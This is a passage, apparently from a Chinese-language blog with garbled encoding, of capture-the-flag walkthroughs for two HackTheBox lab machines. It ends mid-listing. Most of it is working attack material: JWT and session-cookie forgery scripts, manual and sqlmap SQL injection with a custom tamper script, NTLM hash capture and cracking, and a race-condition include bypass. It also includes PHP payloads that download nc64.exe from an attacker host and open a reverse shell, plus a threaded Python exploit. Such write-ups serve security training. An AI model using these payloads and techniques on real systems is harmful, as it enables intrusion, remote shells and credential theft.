(CODE:403|SIZE:301)+ http://10.10.10.228/portal/com2 (CODE:403|SIZE:301)+ http://10.10.10.228/portal/com3 (CODE:403|SIZE:301)+ http://10.10.10.228/portal/con (CODE:403|SIZE:301)==&gt; DIRECTORY: http://10.10.10.228/portal/db/==&gt; DIRECTORY: http://10.10.10.228/portal/DB/==&gt; DIRECTORY: http://10.10.10.228/portal/includes/+ http://10.10.10.228/portal/index.php (CODE:302|SIZE:0)+ http://10.10.10.228/portal/lpt1 (CODE:403|SIZE:301)+ http://10.10.10.228/portal/lpt2 (CODE:403|SIZE:301)+ http://10.10.10.228/portal/nul (CODE:403|SIZE:301)==&gt; DIRECTORY: http://10.10.10.228/portal/php/==&gt; DIRECTORY: http://10.10.10.228/portal/PHP/+ http://10.10.10.228/portal/prn (CODE:403|SIZE:301)==&gt; DIRECTORY: http://10.10.10.228/portal/uploads/==&gt; DIRECTORY: http://10.10.10.228/portal/vendor/-----------------END_TIME: Sat Jun 12 13:42:20 2021DOWNLOADED: 9224 - FOUND: 27 æ¼æ´åˆ©ç”¨ è®¿é—®è·¯å¾„/php/books.php 123POST /includes/bookController.php HTTP/1.1title=a&amp;author=&amp;method=0 123POST /includes/bookController.php HTTP/1.1book=book7.html&amp;method=1 å¯ä»¥çœ‹åˆ°å¯¹/includes/bookController.phpå‘èµ·çš„ä¸¤ç§POSTè¯·æ±‚ ç¬¬äºŒç§è¯·æ±‚å­˜åœ¨LFI 12Warning: file_get_contents(..&#x2F;books&#x2F;): Failed to open stream: No such file or directory in C:\\Users\\www-data\\Desktop\\xampp\\htdocs\\includes\\bookController.php on line 28false ä¸”Apacheé…ç½®ä¸Šå­˜åœ¨ç›®å½•éå†æ¼æ´, å¯ä»¥é…åˆLFIè¿›è¡Œæ–‡ä»¶è¯»å– /portal/authController.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124&lt;?phprequire &#x27;db/db.php&#x27;;require &quot;cookie.php&quot;;require &quot;vendor/autoload.php&quot;;use \\Firebase\\JWT\\JWT;$errors = array();$username = &quot;&quot;;$userdata = array();$valid = false;$IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;];//if user clicks on loginif($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &quot;POST&quot;)&#123; if($_POST[&#x27;method&#x27;] == 0)&#123; $username = $_POST[&#x27;username&#x27;]; $password = $_POST[&#x27;password&#x27;]; $query = &quot;SELECT username,position FROM users WHERE username=? LIMIT 1&quot;; $stmt = $con-&gt;prepare($query); $stmt-&gt;bind_param(&#x27;s&#x27;, $username); $stmt-&gt;execute(); $result = $stmt-&gt;get_result(); while ($row = $result-&gt;fetch_array(MYSQLI_ASSOC))&#123; array_push($userdata, $row); &#125; $userCount = $result-&gt;num_rows; $stmt-&gt;close(); if($userCount &gt; 0)&#123; $password = sha1($password); $passwordQuery = &quot;SELECT * FROM users WHERE password=? AND username=? LIMIT 1&quot;; $stmt = $con-&gt;prepare($passwordQuery); $stmt-&gt;bind_param(&#x27;ss&#x27;, $password, $username); $stmt-&gt;execute(); $result = $stmt-&gt;get_result(); if($result-&gt;num_rows &gt; 0)&#123; $valid = true; &#125; $stmt-&gt;close(); &#125; if($valid)&#123; session_id(makesession($username)); session_start(); $secret_key = &#x27;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&#x27;; $data = array(); $payload = array( &quot;data&quot; =&gt; array( &quot;username&quot; =&gt; $username )); $jwt = JWT::encode($payload, $secret_key, &#x27;HS256&#x27;); setcookie(&quot;token&quot;, $jwt, time() + (86400 * 30), &quot;/&quot;); $_SESSION[&#x27;username&#x27;] = $username; $_SESSION[&#x27;loggedIn&#x27;] = true; if($userdata[0][&#x27;position&#x27;] == &quot;&quot;)&#123; $_SESSION[&#x27;role&#x27;] = &quot;Awaiting approval&quot;; &#125; else&#123; $_SESSION[&#x27;role&#x27;] = $userdata[0][&#x27;position&#x27;]; &#125; header(&quot;Location: /portal&quot;); &#125; else&#123; $_SESSION[&#x27;loggedIn&#x27;] = false; $errors[&#x27;valid&#x27;] = &quot;Username or Password incorrect&quot;; &#125; &#125; elseif($_POST[&#x27;method&#x27;] == 1)&#123; $username=$_POST[&#x27;username&#x27;]; $password=$_POST[&#x27;password&#x27;]; $passwordConf=$_POST[&#x27;passwordConf&#x27;]; if(empty($username))&#123; $errors[&#x27;username&#x27;] = &quot;Username Required&quot;; &#125; if(strlen($username) &lt; 4)&#123; $errors[&#x27;username&#x27;] = &quot;Username must be at least 4 characters long&quot;; &#125; if(empty($password))&#123; $errors[&#x27;password&#x27;] = &quot;Password Required&quot;; &#125; if($password !== $passwordConf)&#123; $errors[&#x27;passwordConf&#x27;] = &quot;Passwords don&#x27;t match!&quot;; &#125; $userQuery = &quot;SELECT * FROM users WHERE username=? LIMIT 1&quot;; $stmt = $con-&gt;prepare($userQuery); $stmt -&gt;bind_param(&#x27;s&#x27;,$username); $stmt-&gt;execute(); $result = $stmt-&gt;get_result(); $userCount = $result-&gt;num_rows; $stmt-&gt;close(); if($userCount &gt; 0)&#123; $errors[&#x27;username&#x27;] = &quot;Username already exists&quot;; &#125; if(count($errors) === 0)&#123; $password = sha1($password); $sql = &quot;INSERT INTO users(username, password, age, position) VALUES (?,?, 0, &#x27;&#x27;)&quot;; $stmt = $con-&gt;prepare($sql); $stmt -&gt;bind_param(&#x27;ss&#x27;, $username, $password); if ($stmt-&gt;execute())&#123; $user_id = $con-&gt;insert_id; header(&#x27;Location: login.php&#x27;); &#125; else&#123; $_SESSION[&#x27;loggedIn&#x27;] = false; $errors[&#x27;db_error&#x27;]=&quot;Database error: failed to register&quot;; &#125; &#125; &#125;&#125; /portal/cookie.php 123456789101112131415161718&lt;?php/** * @param string $username Username requesting session cookie * * @return string $session_cookie Returns the generated cookie * * @devteam * Please DO NOT use default PHPSESSID; our security team says they are predictable. * CHANGE SECOND PART OF MD5 KEY EVERY WEEK * */function makesession($username)&#123; $max = strlen($username) - 1; $seed = rand(0, $max); $key = &quot;s4lTy_stR1nG_&quot;.$username[$seed].&quot;(!528.\\/9890&quot;; $session_cookie = $username.md5($key); return $session_cookie;&#125; /portal/includes/fileController.php 12345678910111213141516171819202122232425262728293031323334353637&lt;?php$ret = &quot;&quot;;require &quot;../vendor/autoload.php&quot;;use \\Firebase\\JWT\\JWT;session_start();function validate()&#123; $ret = false; $jwt = $_COOKIE[&#x27;token&#x27;]; $secret_key = &#x27;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&#x27;; $ret = JWT::decode($jwt, $secret_key, array(&#x27;HS256&#x27;)); return $ret;&#125;if($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &quot;POST&quot;)&#123; $admins = array(&quot;paul&quot;); $user = validate()-&gt;data-&gt;username; if(in_array($user, $admins) &amp;&amp; $_SESSION[&#x27;username&#x27;] == &quot;paul&quot;)&#123; error_reporting(E_ALL &amp; ~E_NOTICE); $uploads_dir = &#x27;../uploads&#x27;; $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; $name = $_POST[&#x27;task&#x27;]; if(move_uploaded_file($tmp_name, &quot;$uploads_dir/$name&quot;))&#123; $ret = &quot;Success. Have a great weekend!&quot;; &#125; else&#123; $ret = &quot;Missing file or title :(&quot; ; &#125; &#125; else&#123; $ret = &quot;Insufficient privileges. Contact admin or developer to upload code. Note: If you recently registered, please wait for one of our admins to approve it.&quot;; &#125; echo $ret;&#125; /portal/php/files.php 123456789101112131415&lt;?phpsession_start();$LOGGED_IN = false;if($_SESSION[&#x27;username&#x27;] !== &quot;paul&quot;)&#123; header(&quot;Location: ../index.php&quot;);&#125;if(isset($_SESSION[&#x27;loggedIn&#x27;]))&#123; $LOGGED_IN = true; require &#x27;../db/db.php&#x27;;&#125;else&#123; header(&quot;Location: ../auth/login.php&quot;); die();&#125;?&gt; è€Œä¸”files.phpå­˜åœ¨ä¸€ä¸ªä¸Šä¼ åŠŸèƒ½ ä»¥ç†ä¸€ä¸‹æ”»å‡»é“¾ fileController.phpä¸Šä¼ æ–‡ä»¶ è¦æ±‚å¾—åˆ°paulçš„èº«ä»½ ç”ŸæˆPHPSESSIDå’ŒJWT å¯¹äºJWT æˆ‘ä»¬å·²ç»å¾—åˆ°äº†ç­¾åå¯†é’¥ 123456#!/usr/bin/env python2import jwttoken_dict = &#123;&quot;data&quot;:&#123;&quot;username&quot;:&quot;paul&quot;&#125;&#125;headers = &#123;&quot;typ&quot;:&quot;JWT&quot;, &quot;alg&quot;:&quot;HS256&quot;&#125;jwt_token = jwt.encode(token_dict, &quot;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&quot;, algorithm=&quot;HS256&quot;, headers=headers).decode(&#x27;ascii&#x27;)print(jwt_token) 1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.4mJguG8tRd2z_feWJpmr_J3AdMeDPvW7GCK7cW7o0AI å¯¹äºPHPSESSID 12345678910&lt;?php $num = array(0, 1, 2, 3); $username = &quot;paul&quot;; foreach($num as $a) &#123; $key = &quot;s4lTy_stR1nG_&quot;.$username[$a].&quot;(!528./9890&quot;; $session_cookie = $username.md5($key); echo $session_cookie.&quot;\\n&quot;; &#125;?&gt; 1234paula2a6a014d3bee04d7df8d5837d62e8c5paul61ff9d4aaefe6bdf45681678ba89ff9dpaul8c8808867b53c49777fe5559164708c3paul47200b180ccd6835d25d034eeb6e6390 æœ€åå¾—åˆ°çš„Cookieä¸º 1Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.4mJguG8tRd2z_feWJpmr_J3AdMeDPvW7GCK7cW7o0AI; PHPSESSID=paul47200b180ccd6835d25d034eeb6e6390 ä¸Šä¼ ZIPæ—¶ä¿®æ”¹æ–‡ä»¶åå’Œæ–‡ä»¶å†…å®¹å³å¯GetShell æƒé™æå‡ 1type C:\\Users\\www-data\\Desktop\\xampp\\htdocs\\portal\\pizzaDeliveryUserData\\juliette.json 1234567891011&#123; &quot;pizza&quot; : &quot;margherita&quot;, &quot;size&quot; : &quot;large&quot;, &quot;drink&quot; : &quot;water&quot;, &quot;card&quot; : &quot;VISA&quot;, &quot;PIN&quot; : &quot;9890&quot;, &quot;alternate&quot; : &#123; &quot;username&quot; : &quot;juliette&quot;, &quot;password&quot; : &quot;jUli901./())!&quot;, &#125;&#125; ä½¿ç”¨å‡­è¯juliette:jUli901./())!ç™»å…¥sshæœåŠ¡ 12345678910111213141516171819202122232425262728293031323334353637383940type C:\\Users\\juliette\\Desktop\\user.txtc5d9d568c5fc21e0dc0c5819d16aad9ftype C:\\Users\\juliette\\Desktop\\todo.html&lt;html&gt;&lt;style&gt;html&#123;background:black;color:orange;&#125;table,th,td&#123;border:1px solid orange;padding:1em;border-collapse:collapse;&#125;&lt;/style&gt;&lt;table&gt; &lt;tr&gt; &lt;th&gt;Task&lt;/th&gt; &lt;th&gt;Status&lt;/th&gt; &lt;th&gt;Reason&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Configure firewall for port 22 and 445&lt;/td&gt; &lt;td&gt;Not started&lt;/td&gt; &lt;td&gt;Unauthorized access might be possible&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager&lt;/td&gt; &lt;td&gt;In progress&lt;/td&gt; &lt;td&gt;It stores passwords in plain text&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Add new features to password manager&lt;/td&gt; &lt;td&gt;Not started&lt;/td&gt; &lt;td&gt;To get promoted, hopefully lol&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;&lt;/html&gt; å¯»æ‰¾å¯†ç å­˜å‚¨æ–‡ä»¶ 12345dir C:\\Users\\juliette\\Documents11/29/2020 04:10 AM 4,096 plum.sqlite01/15/2021 05:10 PM 32,768 plum.sqlite-shm01/15/2021 05:10 PM 329,632 plum.sqlite-wal å¤åˆ¶åˆ°æœ¬åœ°ä½¿ç”¨sqliteè®¿é—® 12345678sqlite3 plum.sqlite sqlite&gt; .tablesMedia Stroke SyncState User Note StrokeMetadata UpgradedNote sqlite&gt; select * from Note;\\id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())!\\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g\\id=48924119-7212-4b01-9e0f-ae6d678d49b2 administrator: [MOVED]|ManagedPosition=|1|0||Yellow|0|||||||0c32c3d8-7c60-48ae-939e-798df198cfe7|8e814e57-9d28-4288-961c-31c806338c5b|637423162765765332||637423163995607122 å¾—åˆ°å‡­è¯development:fN3)sN5Ee@g ç™»å…¥sshæœåŠ¡ 123dir c:\\Development11/29/2020 04:11 AM 18,312 Krypter_Linux IDAåç¼–è¯‘ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859int __cdecl main(int argc, const char **argv, const char **envp)&#123; size_t v3; // rbx __int64 v4; // rax char v6[44]; // [rsp+10h] [rbp-50h] BYREF int v7; // [rsp+3Ch] [rbp-24h] __int64 v8; // [rsp+40h] [rbp-20h] int i; // [rsp+48h] [rbp-18h] int v10; // [rsp+4Ch] [rbp-14h] std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(v6, argv, envp); v8 = curl_easy_init(); puts( &quot;Krypter V1.2\\n&quot; &quot;\\n&quot; &quot;New project by Juliette.\\n&quot; &quot;New features added weekly!\\n&quot; &quot;What to expect next update:\\n&quot; &quot;\\t- Windows version with GUI support\\n&quot; &quot;\\t- Get password from cloud and AUTOMATICALLY decrypt!\\n&quot; &quot;***\\n&quot;); if ( argc == 2 ) &#123; v10 = 0; for ( i = 0; ; ++i ) &#123; v3 = i; if ( v3 &gt;= strlen(argv[1]) ) break; v10 += argv[1][i]; &#125; if ( v10 == 1601 ) &#123; if ( v8 ) &#123; puts(&quot;Requesting decryption key from cloud...\\nAccount: Administrator&quot;); curl_easy_setopt(v8, 10002LL, (__int64)&quot;http://passmanager.htb:1234/index.php&quot;); curl_easy_setopt(v8, 10015LL, (__int64)&quot;method=select&amp;username=administrator&amp;table=passwords&quot;); curl_easy_setopt(v8, 20011LL, (__int64)WriteCallback); curl_easy_setopt(v8, 10001LL, (__int64)v6); v7 = curl_easy_perform(v8); curl_easy_cleanup(v8); puts(&quot;Server response:\\n\\n&quot;); v4 = std::operator&lt;&lt;&lt;char&gt;(&amp;std::cout, v6); std::ostream::operator&lt;&lt;(v4, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); &#125; &#125; else &#123; puts(&quot;Incorrect master key&quot;); &#125; &#125; else &#123; puts(&quot;No key supplied.\\nUSAGE:\\n\\nKrypter &lt;key&gt;&quot;); &#125; std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(v6); return 0;&#125; 123netstat -ant TCP 127.0.0.1:1234 0.0.0.0:0 LISTENING InHost ç”¨ç¨‹åºä¸­çš„URLè®¿é—® 123456789curl &quot;http://127.0.0.1:1234/index.php?method=select&amp;username=administrator&amp;table=passwords&quot;selectarray(1) &#123; [0]=&gt; array(1) &#123; [&quot;aes_key&quot;]=&gt; string(16) &quot;k19D193j.&lt;19391(&quot; &#125;&#125; å¾—åˆ°AES_KEY å°è¯•SQLæ³¨å…¥ 12345678curl &quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+or+1%23&amp;table=passwords&quot;selectarray(1) &#123; [0]=&gt; array(1) &#123; [&quot;aes_key&quot;]=&gt; string(16) &quot;k19D193j.&lt;19391(&quot; &#125;&#125; æ‰‹å·¥æ³¨å…¥ 123456curl &quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+or+1%23&amp;table=passwords&quot;curl &quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+1%23&amp;table=passwords&quot;curl &quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+database()%23&amp;table=passwords&quot;curl &quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+group_concat(table_name)+from+information_schema.tables+where+table_schema=&#x27;bread&#x27;%23&amp;table=passwords&quot;curl &quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+group_concat(column_name)+from+information_schema.columns+where+table_name=&#x27;passwords&#x27;%23&amp;table=passwords&quot;curl &quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+group_concat(password)+from+bread.passwords%23&amp;table=passwords&quot; å¾—åˆ°H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw= SSHç«¯å£æ˜ å°„è·‘SQLMap 12ssh -f -N -L 1234:127.0.0.1:1234 development@10.10.10.228sqlmap -u &quot;http://127.0.0.1:1234/index.php?method=select&amp;username=administrator&amp;table=passwords&quot; sqlmapçš„æ­¥éª¤å°±æ‡’å¾—å†™äº† è§£å¯† 12345678#!/usr/bin/env python3import base64from Crypto.Cipher import AESiv = b&#x27;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#x27;cipher = base64.b64decode(&quot;H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=&quot;)_aes = AES.new(b&quot;k19D193j.&lt;19391(&quot;, AES.MODE_CBC, iv)plain = _aes.decrypt(cipher)print(plain) å¾—åˆ°å‡­è¯administrator:p@ssw0rd!@#$9890./ ç™»å…¥SSHæœåŠ¡ 12type c:\\Users\\Administrator\\Desktop\\root.txtc04f72045d76a74c63a602f199a79ecd æŒºç»¼åˆçš„ä¸€å°æœºå™¨ HackTheBox_Proper ç«¯å£æ‰«æ 12345678nmap -sV -sT -Pn 10.10.10.231Nmap scan report for 10.10.10.231Host is up (0.081s latency).Not shown: 999 filtered portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows è·¯å¾„æ‰«æ 123---- Scanning URL: http://10.10.10.231/ ----==&gt; DIRECTORY: http://10.10.10.231/assets/==&gt; DIRECTORY: http://10.10.10.231/licenses/ æ¼æ´åˆ©ç”¨ æµè§ˆä¸»é¡µæºç çœ‹åˆ° 1234567&lt;script type=&quot;text/javascript&quot;&gt;$(document).ready(function()&#123; &#x27;use strict&#x27;; jQuery(&#x27;#headerwrap&#x27;).backstretch([ &quot;assets/img/bg/bg1.jpg&quot;, &quot;assets/img/bg/bg3.jpg&quot; ], &#123;duration: 8000, fade: 500&#125;); $( &quot;#product-content&quot; ).load(&quot;/products-ajax.php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b&quot;,function() &#123;&#125;);&#125;);&lt;/script&gt; 1curl http://10.10.10.231/products-ajax.php 123456789101112&lt;?php // [8] Undefined index: order On line 6 in file C:\\inetpub\\wwwroot\\products-ajax.php define(&#x27;SECURE_PARAM_SALT&#x27;,&#x27;hie0shah6ooNoim&#x27;); include(&#x27;functions.php&#x27;); include(&#x27;db-config.php&#x27;); if ( !$_GET[&#x27;order&#x27;] || !$_GET[&#x27;h&#x27;] ) &#123; // Set the response code to 500 http_response_code(500); // and die(). Someone fiddled with the parameters. die(&#x27;Parameter missing or malformed.&#x27;); &#125; ?&gt; æµ‹è¯•å¾—åˆ°ä»¥ä¸‹ç®—æ³• Hash = md5(Salt+Payload) SQLMap tamper 123456789101112#!/usr/bin/env python3import osimport stringimport hashlibfrom urllib.parse import quote_plusfrom lib.core.enums import PRIORITYdef tamper(payload, **kwargs): salt = b&quot;hie0shah6ooNoim&quot; h = hashlib.md5(salt + payload.encode()).hexdigest() retVal = &quot;&#123;&#125;&amp;h=&#123;&#125;&quot;.format(payload, h) return retVal 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687sqlmap -u &quot;http://10.10.10.231/products-ajax.php?order=1&quot; --tamper=tamp.py --dbs --batch --skip-urlencodeavailable databases [3]:[*] cleaner[*] information_schema[*] testsqlmap -u &quot;http://10.10.10.231/products-ajax.php?order=1&quot; --tamper=tamp.py -D cleaner --tables --batch --skip-urlencodeDatabase: cleaner[3 tables]+-----------+| customers || licenses || products |+-----------+sqlmap -u &quot;http://10.10.10.231/products-ajax.php?order=1&quot; --tamper=tamp.py -D cleaner -T licenses --columns --batch --skip-urlencodeDatabase: cleanerTable: licenses[4 columns]+-------------+-------------+| Column | Type |+-------------+-------------+| customer_id | int(11) || id | int(11) || license | varchar(50) || product_id | int(11) |+-------------+-------------+proxychains sqlmap -u &quot;http://10.10.10.231/products-ajax.php?order=1&quot; --tamper=tamp.py -D cleaner -T licenses -D customer_id,id,license,product_id --dump --batch --skip-urlencodeDatabase: cleanerTable: licenses[18 entries]+-------------+----+--------------------------------------+------------+| customer_id | id | license | product_id |+-------------+----+--------------------------------------+------------+| 4 | 1 | 7d4cdf91-119b-414d-b16b-7cb841b2c182 | 4 || 17 | 2 | e7b59b20-8c70-48b0-91da-58bf354b18d5 | 8 || 17 | 3 | 3ea26f9c-f7c8-428f-a613-f4c66f08d0b9 | 6 || 17 | 4 | 372b02bd-8730-4bc6-a6fb-8cf9726f797b | 4 || 15 | 5 | 75ab3363-43d4-4e6b-903a-9d36919b36be | 8 || 16 | 6 | 139aff78-770c-4c59-9aef-32c4c65e68b3 | 4 || 22 | 7 | bdf82583-9f1a-42a3-b892-4b569e77f4c9 | 2 || 11 | 8 | d7da6b56-6f8c-4a26-85cc-c80860f3021a | 8 || 21 | 9 | 2ca03799-bd0d-4baa-a163-eb2a3b143f22 | 4 || 7 | 10 | 0a65e4e4-f1c7-4452-9bf0-02f4d6c35410 | 4 || 7 | 11 | 2e14ce43-8e85-43d7-b9ae-ab2c2ff64bf8 | 4 || 15 | 12 | 873f8add-2f3c-4da2-9164-649f55c1d329 | 4 || 2 | 13 | c63524b6-6346-4a34-b5c3-a3fe46593df1 | 4 || 25 | 14 | ad228131-518a-4527-8a1c-46d0723b691d | 2 || 1 | 15 | 4fa6a5cd-2081-4222-9b46-6c58df72bcfd | 8 || 1 | 16 | 183a7e47-e3cf-46f9-80fa-acb63590cc1c | 2 || 9 | 17 | 49dea5ef-3f7f-4790-9b94-b6bf29f5f893 | 2 || 4 | 18 | 41e5be3a-20fc-47b2-9dcc-c05def688cdb | 6 |+-------------+----+--------------------------------------+------------+sqlmap -u &quot;http://10.10.10.231/products-ajax.php?order=1&quot; --tamper=tamp.py -D cleaner -T customers --columns --batch --skip-urlencodeDatabase: cleanerTable: customers[4 columns]+---------------+--------------+| Column | Type |+---------------+--------------+| customer_name | varchar(50) || id | int(11) || login | varchar(255) || password | varchar(255) |+---------------+--------------+sqlmap -u &quot;http://10.10.10.231/products-ajax.php?order=1&quot; --tamper=tamp.py -D cleaner -T customers -C customer_name,id,login,password --dump --batch --skip-urlencodeDatabase: cleanerTable: customers[11 entries]+---------------------+----+------------------------------+----------------------------------+| customer_name | id | login | password |+---------------------+----+------------------------------+----------------------------------+| Vikki Solomon | 1 | vikki.solomon@throwaway.mail | 7c6a180b36896a0a8c02787eeafb0e4c || Neave Stone | 2 | nstone@trashbin.mail | 6cb75f652a9b52798eb6cf2201057c73 || Bertie McEachern | 3 | bmceachern7@discovery.moc | e10adc3949ba59abbe56e057f20f883e || Jordana Kleiser | 4 | jkleiser8@google.com.xy | 827ccb0eea8a706c4c34a16891f84e7b || Mariellen Chasemore | 5 | mchasemore9@sitemeter.moc | 25f9e794323b453885f5181f1b624d0b || Gwyneth Dornin | 6 | gdornina@marriott.moc | 5f4dcc3b5aa765d61d8327deb882cf99 || Israel Tootell | 7 | itootellb@forbes.moc | f25a2fc72690b780b2a14e140ef6a9e0 || Karon Mangham | 8 | kmanghamc@state.tx.su | 8afa847f50a716e64932d995c8e7435a || Janifer Blinde | 9 | jblinded@bing.moc | fcea920f7412b5da7be0cf42b8c93759 || Laurens Lenchenko | 10 | llenchenkoe@macromedia.moc | f806fc5a2a0d5ba2471600758452799c || Andreana Austin | 11 | aaustinf@booking.moc | 25d55ad283aa400af464c76d713c07ad |+---------------------+----+------------------------------+----------------------------------+ MD5åŸºæœ¬éƒ½æ˜¯å¼±å£ä»¤ éšæ„ç”¨ä¸€ä¸ªå‡­è¯ç™»å…¥ 1curl http://10.10.10.231/licenses/licenses.php?theme=&amp;h=9094e65be4a9dc27cd4af70674a99c64 12345678910111213&lt;?php // [2] include(/header.inc): failed to open stream: No such file or directory On line 36 in file C:\\inetpub\\wwwroot\\functions.php // Following function securely includes a file. Whenever we // will encounter a PHP tag we will just bail out here. function secure_include($file) &#123; if (strpos(file_get_contents($file),&#x27;&lt;?&#x27;) === false) &#123; include($file); //&lt;&lt;&lt;&lt;&lt; Error encountered in this line. &#125; else &#123; http_response_code(403); die(&#x27;Forbidden - Tampering attempt detected.&#x27;); &#125; &#125; ?&gt; å°è¯•RFI 1python3 -m http.server 9998 1234curl http://10.10.10.231/licenses/licenses.php?theme=http://10.10.16.7:9998/&amp;h=c68113684a9e7ddca835d8f0235e2759[2] include(): http:// wrapper is disabled in the server configuration by allow_url_include=0On line 36 in file C:\\inetpub\\wwwroot\\functions.php ä¸èƒ½ä½¿ç”¨httpåè®® 12python3 smbserver.py -ip 10.10.16.7 -smb2support evil .curl http://10.10.10.231/licenses/licenses.php?theme=//10.10.16.7&amp;h=b1a3d9ecf02d4854f3a730f8b2a9af5d 123456[*] Incoming connection (10.10.10.231,51174)[*] AUTHENTICATE_MESSAGE (PROPER\\web,PROPER)[*] User PROPER\\web authenticated successfully[*] web::PROPER:aaaaaaaaaaaaaaaa:956a52cc975ff5da7c40b3a88a2280cd:0101000000000000808cbaf62b60d701fee1b72b5916ee630000000001001000670049005600790046004b0055006a00020010005a004a006b004300690054006a00480003001000670049005600790046004b0055006a00040010005a004a006b004300690054006a00480007000800808cbaf62b60d70106000400020000000800300030000000000000000000000000200000df729e7896fc8038dada23bc657eaeb31358ef464f456b1fa869efec2d18cea10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0037000000000000000000[*] Closing down connection (10.10.10.231,51174)[*] Remaining connections [] æ‹¿åˆ°Hash 12345cat hash web::PROPER:aaaaaaaaaaaaaaaa:956a52cc975ff5da7c40b3a88a2280cd:0101000000000000808cbaf62b60d701fee1b72b5916ee630000000001001000670049005600790046004b0055006a00020010005a004a006b004300690054006a00480003001000670049005600790046004b0055006a00040010005a004a006b004300690054006a00480007000800808cbaf62b60d70106000400020000000800300030000000000000000000000000200000df729e7896fc8038dada23bc657eaeb31358ef464f456b1fa869efec2d18cea10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0037000000000000000000john --wordlist=/usr/share/wordlists/rockyou.txt hashcharlotte123! (web) å¾—åˆ°å‡­è¯ 1web:charlotte123! é‡å¯smbæœåŠ¡ 1python3 smbserver.py -ip 10.10.16.7 -username web -password charlotte123! -smb2support yolo . 12if (strpos(file_get_contents($file),&#x27;&lt;?&#x27;) === false) &#123; include($file); //&lt;&lt;&lt;&lt;&lt; Error encountered in this line. é€šè¿‡ç«äº‰ä¿®æ”¹æœ¬åœ°æ–‡ä»¶å†…å®¹æ¥è¿›è¡ŒBypass 123456#!/bin/bashpayload=$1while((1))do echo &quot;$payload&quot; &gt; header.incdone GetShell 1&lt;?php echo &quot;hacked&quot;;system(&quot;cmd /c powershell iwr http://10.10.16.7:9995/nc64.exe -outf \\windows\\system32\\spool\\drivers\\color\\yolo.exe&quot;); ?&gt; 1&lt;?php echo &quot;hacked&quot;;system(&quot;cmd /c start \\windows\\system32\\spool\\drivers\\color\\yolo.exe -e cmd 10.10.16.7 9990&quot;); ?&gt; 123456789101112131415161718192021222324252627282930#!/usr/bin/env python3import requestsimport randomimport threadingdef thd(): _ = 0 while _ &lt; 100: req = requests.session() login_url = &quot;http://10.10.10.231/licenses/index.php&quot; username = &quot;vikki.solomon@throwaway.mail&quot; password = &quot;password1&quot; data = &#123;&quot;username&quot;:username, &quot;password&quot;:password&#125; res = req.post(url=login_url, data=data) index_url = &quot;http://10.10.10.231/licenses/licenses.php&quot; res = req.get(url=index_url) payload_url = &quot;http://10.10.10.231/licenses/licenses.php?theme=//10.10.16.7/yolo&amp;h=05e45a8f5f58f601063e937929048fd7&quot; res = req.get(url=payload_url) if &quot;hacked&quot; in res.text: print(res.text) logout_url = &quot;http://10.10.10.231/licenses/logout.php&quot; res = req.get(url=logout_url) _ += 1poll = []for i in range(0, 5): single_thd = threading.Thread(target=thd) poll.append(single_thd)for n in poll: n.start() 1cmd /c powershell iwr http://10.10.16.7:9995/nc64.exe -outf \\windows\\system32\\spool\\drivers\\color\\nc64.exe ä¸è¡Œ 1cmd /c powershell iwr http://10.10.16.7:9995/nc64.exe -outf \\windows\\system32\\spool\\drivers\\color\\yolo.exe è¡Œ ä¸çŸ¥é“è§¦å‘äº†ä»€ä¹ˆå¥‡æ€ªçš„bug, æ”¹ä¸ªæ–‡ä»¶åå°±èƒ½å†™å…¥äº† å®¶ç›®å½•ä¸‹å°±èƒ½å†™, å®³éš”ç€World-Writableå‘¢ 12type c:\\users\\web\\desktop\\user.txt540dbda93520798e554345539fe38988 æƒé™æå‡ 12345dir \\&quot;Program Files&quot;\\cleanup11/15/2020 05:03 AM 2,999,808 client.exe11/15/2020 10:22 AM 